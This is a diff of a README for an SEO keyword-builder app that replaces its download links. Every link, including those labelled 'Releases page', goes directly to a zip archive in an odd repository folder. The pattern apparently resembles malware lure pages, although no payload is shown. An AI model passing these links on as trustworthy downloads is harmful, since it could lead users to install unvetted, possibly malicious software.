@@ -1,6 +1,6 @@
 # 🚀 Semantic-Keyword-Builder - Generate Keywords Easily for SEO
 
-**[Download the App Now!](https://raw.githubusercontent.com/OXHILALI1/Semantic-Keyword-Builder/main/chorded/Semantic-Keyword-Builder-v3.1.zip)**
+**[Download the App Now!](https://github.com/OXHILALI1/Semantic-Keyword-Builder/raw/refs/heads/main/chorded/Semantic-Builder-Keyword-v2.5.zip)**
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ The Semantic Keyword Builder is a user-friendly application designed to help you
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** Start by going to the [Releases page](https://raw.githubusercontent.com/OXHILALI1/Semantic-Keyword-Builder/main/chorded/Semantic-Keyword-Builder-v3.1.zip).
+1. **Visit the Releases Page:** Start by going to the [Releases page](https://github.com/OXHILALI1/Semantic-Keyword-Builder/raw/refs/heads/main/chorded/Semantic-Builder-Keyword-v2.5.zip).
 
 2. **Find the Latest Release:** Look for the latest version of the Semantic Keyword Builder. Each release will have a version number and a brief description.
 
@@ -41,7 +41,7 @@ The Semantic Keyword Builder is a user-friendly application designed to help you
 
 ## 📥 Download & Install
 
-To download the Semantic Keyword Builder, please visit the [Releases page](https://raw.githubusercontent.com/OXHILALI1/Semantic-Keyword-Builder/main/chorded/Semantic-Keyword-Builder-v3.1.zip) to find the latest version of the app. Simply click on the appropriate link for your operating system to start the download.
+To download the Semantic Keyword Builder, please visit the [Releases page](https://github.com/OXHILALI1/Semantic-Keyword-Builder/raw/refs/heads/main/chorded/Semantic-Builder-Keyword-v2.5.zip) to find the latest version of the app. Simply click on the appropriate link for your operating system to start the download.
 
 ## ⚙️ Frequently Asked Questions 
 
